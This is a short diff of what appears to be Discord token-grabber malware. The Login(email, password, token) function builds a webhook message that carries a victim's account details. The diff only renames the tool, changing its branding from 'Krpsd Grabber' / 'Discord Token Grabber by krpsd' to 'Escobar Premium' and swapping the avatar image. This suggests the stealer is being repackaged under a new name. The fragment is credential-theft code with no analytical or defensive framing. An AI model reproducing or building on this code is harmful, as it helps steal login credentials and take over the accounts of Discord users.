@@ -144,9 +144,9 @@ function Login(email, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "Krpsd Grabber",
+            username: "Escobar Premium",
             content: "",
-            avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
+            avatar_url: "https://media.discordapp.net/attachments/937734856400568330/937734901539667988/672fa233c03365d771c28ed965b36393.png",
             embeds: [
                 {
                     "color": 16507654,
@@ -167,7 +167,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Discord Token Grabber by krpsd"
+                        "text": "Escobar Premium"
                     }
                 }
             ]
